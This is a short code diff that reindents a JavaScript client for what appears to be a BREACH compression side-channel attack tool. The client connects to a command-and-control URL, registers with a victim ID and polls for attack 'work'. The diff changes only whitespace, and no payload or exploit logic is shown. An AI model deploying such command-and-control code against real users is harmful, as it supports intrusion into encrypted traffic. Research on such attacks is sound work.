@@ -11,7 +11,7 @@ var BREACHClient = {
         this._socket = io.connect(config.COMMAND_CONTROL_URL);
         this._socket.on('connect', () => {
             console.log('Connected');
-	     this.noWork(flag);
+            this.noWork(flag);
         });
         this._socket.on('do-work', (work) => {
             console.log('do-work message');
@@ -20,19 +20,19 @@ var BREACHClient = {
         this._socket.on('server-hello', () => {
             this.getWork();
             console.log('Initialized');
-	 });
+        });
         this._socket.on('server-nowork', () => {
             this.noWork(flag);
         });
     },
     noWork(flag) {
-	if (flag == 0) {
+        if (flag == 0) {
             flag = 1;
             this._socket.emit('client-hello', {
-		victim_id: config.VICTIM_ID
+                victim_id: config.VICTIM_ID
             });
-	}
-	else {
+        }
+        else {
             console.log('No work');
             setTimeout(
                 () => {
@@ -42,7 +42,7 @@ var BREACHClient = {
                 },
                 this.MORE_WORK_TIMEOUT
             );
-	}
+        }
     },
     doWork(work) {
         var {url, amount, alignmentalphabet} = work;
